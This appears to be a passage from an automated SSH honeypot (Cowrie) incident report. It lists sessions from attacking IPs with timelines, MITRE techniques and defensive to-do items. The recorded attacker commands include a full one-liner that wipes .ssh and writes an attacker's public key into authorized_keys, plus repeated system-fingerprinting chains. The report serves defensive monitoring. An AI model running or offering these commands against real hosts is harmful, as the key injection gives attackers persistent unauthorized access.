| `2026-07-06 12:46:34` | `cowrie.command.input` |
| `2026-07-06 12:46:34` | `cowrie.command.input` |
| `2026-07-06 12:46:34` | `cowrie.command.input` |
| `2026-07-06 12:46:34` | `cowrie.command.success` |
| `2026-07-06 12:46:34` | `cowrie.command.input` |
| `2026-07-06 12:46:34` | `cowrie.command.input` |
| `2026-07-06 12:46:34` | `cowrie.command.input` |
| `2026-07-06 12:46:34` | `cowrie.command.input` |
| `2026-07-06 12:46:34` | `cowrie.log.closed` |
| `2026-07-06 12:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-214ee2e226dd

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 12:47 |
| **Last Seen** | 2026-07-06 12:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:47:18` | `cowrie.session.connect` |
| `2026-07-06 12:47:18` | `cowrie.client.version` |
| `2026-07-06 12:47:18` | `cowrie.client.kex` |
| `2026-07-06 12:47:18` | `cowrie.login.success` |
| `2026-07-06 12:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71912169210f

| Field | Detail |
|---|---|
| **Source IP** | `45.207.196[.]123` |
| **First Seen** | 2026-07-06 12:47 |
| **Last Seen** | 2026-07-06 12:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:47:20` | `cowrie.session.connect` |
| `2026-07-06 12:47:20` | `cowrie.client.version` |
| `2026-07-06 12:47:21` | `cowrie.client.kex` |
| `2026-07-06 12:47:22` | `cowrie.login.success` |
| `2026-07-06 12:47:23` | `cowrie.session.params` |
| `2026-07-06 12:47:23` | `cowrie.command.input` |
| `2026-07-06 12:47:23` | `cowrie.command.failed` |
| `2026-07-06 12:47:23` | `cowrie.log.closed` |
| `2026-07-06 12:47:24` | `cowrie.session.params` |
| `2026-07-06 12:47:24` | `cowrie.command.input` |
| `2026-07-06 12:47:24` | `cowrie.session.file_download` |
| `2026-07-06 12:47:24` | `cowrie.log.closed` |
| `2026-07-06 12:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.196[.]123` to AbuseIPDB if not already reported
- [ ] Block `45.207.196[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ffefbe31d9

| Field | Detail |
|---|---|
| **Source IP** | `45.207.196[.]123` |
| **First Seen** | 2026-07-06 12:47 |
| **Last Seen** | 2026-07-06 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:47:24` | `cowrie.session.connect` |
| `2026-07-06 12:47:24` | `cowrie.client.version` |
| `2026-07-06 12:47:24` | `cowrie.client.kex` |
| `2026-07-06 12:47:25` | `cowrie.login.success` |
| `2026-07-06 12:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.196[.]123` to AbuseIPDB if not already reported
- [ ] Block `45.207.196[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1347d008aa3a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:47 |
| **Last Seen** | 2026-07-06 12:48 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:47:26` | `cowrie.session.connect` |
| `2026-07-06 12:47:30` | `cowrie.client.version` |
| `2026-07-06 12:47:30` | `cowrie.client.kex` |
| `2026-07-06 12:47:49` | `cowrie.login.success` |
| `2026-07-06 12:47:56` | `cowrie.session.params` |
| `2026-07-06 12:47:56` | `cowrie.command.input` |
| `2026-07-06 12:47:56` | `cowrie.command.input` |
| `2026-07-06 12:47:56` | `cowrie.command.input` |
| `2026-07-06 12:47:56` | `cowrie.command.input` |
| `2026-07-06 12:47:56` | `cowrie.command.input` |
| `2026-07-06 12:47:56` | `cowrie.command.success` |
| `2026-07-06 12:47:56` | `cowrie.command.input` |
| `2026-07-06 12:47:56` | `cowrie.command.input` |
| `2026-07-06 12:47:56` | `cowrie.command.input` |
| `2026-07-06 12:47:56` | `cowrie.command.input` |
| `2026-07-06 12:47:59` | `cowrie.log.closed` |
| `2026-07-06 12:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb5a156be3ff

| Field | Detail |
|---|---|
| **Source IP** | `45.207.196[.]123` |
| **First Seen** | 2026-07-06 12:47 |
| **Last Seen** | 2026-07-06 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:47:26` | `cowrie.session.connect` |
| `2026-07-06 12:47:26` | `cowrie.client.version` |
| `2026-07-06 12:47:26` | `cowrie.client.kex` |
| `2026-07-06 12:47:27` | `cowrie.login.success` |
| `2026-07-06 12:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.196[.]123` to AbuseIPDB if not already reported
- [ ] Block `45.207.196[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d36ab33a2692

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:48 |
| **Last Seen** | 2026-07-06 12:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:48:00` | `cowrie.session.connect` |
| `2026-07-06 12:48:00` | `cowrie.client.version` |
| `2026-07-06 12:48:00` | `cowrie.client.kex` |
| `2026-07-06 12:48:01` | `cowrie.login.success` |
| `2026-07-06 12:48:03` | `cowrie.session.params` |
| `2026-07-06 12:48:03` | `cowrie.command.input` |
| `2026-07-06 12:48:03` | `cowrie.command.input` |
| `2026-07-06 12:48:03` | `cowrie.command.input` |
| `2026-07-06 12:48:03` | `cowrie.command.input` |
| `2026-07-06 12:48:03` | `cowrie.command.input` |
| `2026-07-06 12:48:03` | `cowrie.command.success` |
| `2026-07-06 12:48:03` | `cowrie.command.input` |
| `2026-07-06 12:48:03` | `cowrie.command.input` |
| `2026-07-06 12:48:03` | `cowrie.command.input` |
| `2026-07-06 12:48:03` | `cowrie.command.input` |
| `2026-07-06 12:48:03` | `cowrie.log.closed` |
| `2026-07-06 12:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-179b854560cc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:49 |
| **Last Seen** | 2026-07-06 12:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:49:29` | `cowrie.session.connect` |
| `2026-07-06 12:49:29` | `cowrie.client.version` |
| `2026-07-06 12:49:29` | `cowrie.client.kex` |
| `2026-07-06 12:49:30` | `cowrie.login.success` |
| `2026-07-06 12:49:32` | `cowrie.session.params` |
| `2026-07-06 12:49:32` | `cowrie.command.input` |
| `2026-07-06 12:49:32` | `cowrie.command.input` |
| `2026-07-06 12:49:32` | `cowrie.command.input` |
| `2026-07-06 12:49:32` | `cowrie.command.input` |
| `2026-07-06 12:49:32` | `cowrie.command.input` |
| `2026-07-06 12:49:32` | `cowrie.command.success` |
| `2026-07-06 12:49:32` | `cowrie.command.input` |
| `2026-07-06 12:49:32` | `cowrie.command.input` |
| `2026-07-06 12:49:32` | `cowrie.command.input` |
| `2026-07-06 12:49:32` | `cowrie.command.input` |
| `2026-07-06 12:49:32` | `cowrie.log.closed` |
| `2026-07-06 12:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18e22eea006b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:49 |
| **Last Seen** | 2026-07-06 12:50 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:49:51` | `cowrie.session.connect` |
| `2026-07-06 12:49:54` | `cowrie.client.version` |
| `2026-07-06 12:49:54` | `cowrie.client.kex` |
| `2026-07-06 12:50:09` | `cowrie.login.success` |
| `2026-07-06 12:50:17` | `cowrie.session.params` |
| `2026-07-06 12:50:17` | `cowrie.command.input` |
| `2026-07-06 12:50:17` | `cowrie.command.input` |
| `2026-07-06 12:50:17` | `cowrie.command.input` |
| `2026-07-06 12:50:17` | `cowrie.command.input` |
| `2026-07-06 12:50:17` | `cowrie.command.input` |
| `2026-07-06 12:50:17` | `cowrie.command.success` |
| `2026-07-06 12:50:17` | `cowrie.command.input` |
| `2026-07-06 12:50:17` | `cowrie.command.input` |
| `2026-07-06 12:50:17` | `cowrie.command.input` |
| `2026-07-06 12:50:17` | `cowrie.command.input` |
| `2026-07-06 12:50:20` | `cowrie.log.closed` |
| `2026-07-06 12:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-556ee0804834

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:50 |
| **Last Seen** | 2026-07-06 12:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:50:57` | `cowrie.session.connect` |
| `2026-07-06 12:50:57` | `cowrie.client.version` |
| `2026-07-06 12:50:57` | `cowrie.client.kex` |
| `2026-07-06 12:50:58` | `cowrie.login.success` |
| `2026-07-06 12:51:00` | `cowrie.session.params` |
| `2026-07-06 12:51:00` | `cowrie.command.input` |
| `2026-07-06 12:51:00` | `cowrie.command.input` |
| `2026-07-06 12:51:00` | `cowrie.command.input` |
| `2026-07-06 12:51:00` | `cowrie.command.input` |
| `2026-07-06 12:51:00` | `cowrie.command.input` |
| `2026-07-06 12:51:00` | `cowrie.command.success` |
| `2026-07-06 12:51:00` | `cowrie.command.input` |
| `2026-07-06 12:51:00` | `cowrie.command.input` |
| `2026-07-06 12:51:00` | `cowrie.command.input` |
| `2026-07-06 12:51:00` | `cowrie.command.input` |
| `2026-07-06 12:51:00` | `cowrie.log.closed` |
| `2026-07-06 12:51:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c65507ddc57

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:52 |
| **Last Seen** | 2026-07-06 12:52 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:52:08` | `cowrie.session.connect` |
| `2026-07-06 12:52:12` | `cowrie.client.version` |
| `2026-07-06 12:52:12` | `cowrie.client.kex` |
| `2026-07-06 12:52:28` | `cowrie.login.success` |
| `2026-07-06 12:52:36` | `cowrie.session.params` |
| `2026-07-06 12:52:36` | `cowrie.command.input` |
| `2026-07-06 12:52:36` | `cowrie.command.input` |
| `2026-07-06 12:52:36` | `cowrie.command.input` |
| `2026-07-06 12:52:36` | `cowrie.command.input` |
| `2026-07-06 12:52:36` | `cowrie.command.input` |
| `2026-07-06 12:52:36` | `cowrie.command.success` |
| `2026-07-06 12:52:36` | `cowrie.command.input` |
| `2026-07-06 12:52:36` | `cowrie.command.input` |
| `2026-07-06 12:52:36` | `cowrie.command.input` |
| `2026-07-06 12:52:36` | `cowrie.command.input` |
| `2026-07-06 12:52:39` | `cowrie.log.closed` |
| `2026-07-06 12:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-830e1b4f991d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:52 |
| **Last Seen** | 2026-07-06 12:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:52:25` | `cowrie.session.connect` |
| `2026-07-06 12:52:25` | `cowrie.client.version` |
| `2026-07-06 12:52:25` | `cowrie.client.kex` |
| `2026-07-06 12:52:27` | `cowrie.login.success` |
| `2026-07-06 12:52:28` | `cowrie.session.params` |
| `2026-07-06 12:52:28` | `cowrie.command.input` |
| `2026-07-06 12:52:28` | `cowrie.command.input` |
| `2026-07-06 12:52:28` | `cowrie.command.input` |
| `2026-07-06 12:52:28` | `cowrie.command.input` |
| `2026-07-06 12:52:28` | `cowrie.command.input` |
| `2026-07-06 12:52:28` | `cowrie.command.success` |
| `2026-07-06 12:52:28` | `cowrie.command.input` |
| `2026-07-06 12:52:28` | `cowrie.command.input` |
| `2026-07-06 12:52:28` | `cowrie.command.input` |
| `2026-07-06 12:52:28` | `cowrie.command.input` |
| `2026-07-06 12:52:28` | `cowrie.log.closed` |
| `2026-07-06 12:52:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d86fa6af599a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:53 |
| **Last Seen** | 2026-07-06 12:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:53:52` | `cowrie.session.connect` |
| `2026-07-06 12:53:52` | `cowrie.client.version` |
| `2026-07-06 12:53:52` | `cowrie.client.kex` |
| `2026-07-06 12:53:54` | `cowrie.login.success` |
| `2026-07-06 12:53:55` | `cowrie.session.params` |
| `2026-07-06 12:53:55` | `cowrie.command.input` |
| `2026-07-06 12:53:55` | `cowrie.command.input` |
| `2026-07-06 12:53:55` | `cowrie.command.input` |
| `2026-07-06 12:53:55` | `cowrie.command.input` |
| `2026-07-06 12:53:55` | `cowrie.command.input` |
| `2026-07-06 12:53:55` | `cowrie.command.success` |
| `2026-07-06 12:53:55` | `cowrie.command.input` |
| `2026-07-06 12:53:55` | `cowrie.command.input` |
| `2026-07-06 12:53:55` | `cowrie.command.input` |
| `2026-07-06 12:53:55` | `cowrie.command.input` |
| `2026-07-06 12:53:55` | `cowrie.log.closed` |
| `2026-07-06 12:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-744a45aee93b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:54 |
| **Last Seen** | 2026-07-06 12:54 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:54:23` | `cowrie.session.connect` |
| `2026-07-06 12:54:27` | `cowrie.client.version` |
| `2026-07-06 12:54:27` | `cowrie.client.kex` |
| `2026-07-06 12:54:43` | `cowrie.login.success` |
| `2026-07-06 12:54:52` | `cowrie.session.params` |
| `2026-07-06 12:54:52` | `cowrie.command.input` |
| `2026-07-06 12:54:52` | `cowrie.command.input` |
| `2026-07-06 12:54:52` | `cowrie.command.input` |
| `2026-07-06 12:54:52` | `cowrie.command.input` |
| `2026-07-06 12:54:52` | `cowrie.command.input` |
| `2026-07-06 12:54:52` | `cowrie.command.success` |
| `2026-07-06 12:54:52` | `cowrie.command.input` |
| `2026-07-06 12:54:52` | `cowrie.command.input` |
| `2026-07-06 12:54:52` | `cowrie.command.input` |
| `2026-07-06 12:54:52` | `cowrie.command.input` |
| `2026-07-06 12:54:56` | `cowrie.log.closed` |
| `2026-07-06 12:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **173** | 2026-07-06 06:56 | 2026-07-06 12:55 | 191m | 0 | `T1592` | 🟠 MEDIUM |
| `92.204.138[.]198` | **76** | 2026-07-06 06:56 | 2026-07-06 12:52 | 38m | 0 | `T1592` | 🟠 MEDIUM |
| `164.92.115[.]22` | **59** | 2026-07-06 06:56 | 2026-07-06 12:50 | 40m | 0 | `T1592` | 🟠 MEDIUM |
| `206.81.2[.]201` | **34** | 2026-07-06 07:06 | 2026-07-06 12:28 | 23m | 0 | `T1592` | 🟠 MEDIUM |
| `34.156.162[.]210` | **30** | 2026-07-06 08:40 | 2026-07-06 08:41 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `34.53.187[.]0` | **30** | 2026-07-06 08:00 | 2026-07-06 08:01 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `34.77.97[.]43` | **30** | 2026-07-06 07:16 | 2026-07-06 07:16 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `117.173.65[.]4` | **16** | 2026-07-06 11:09 | 2026-07-06 11:38 | 27m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **14** | 2026-07-06 07:13 | 2026-07-06 12:34 | 0m | 0 | `T1592` | 🟠 MEDIUM |
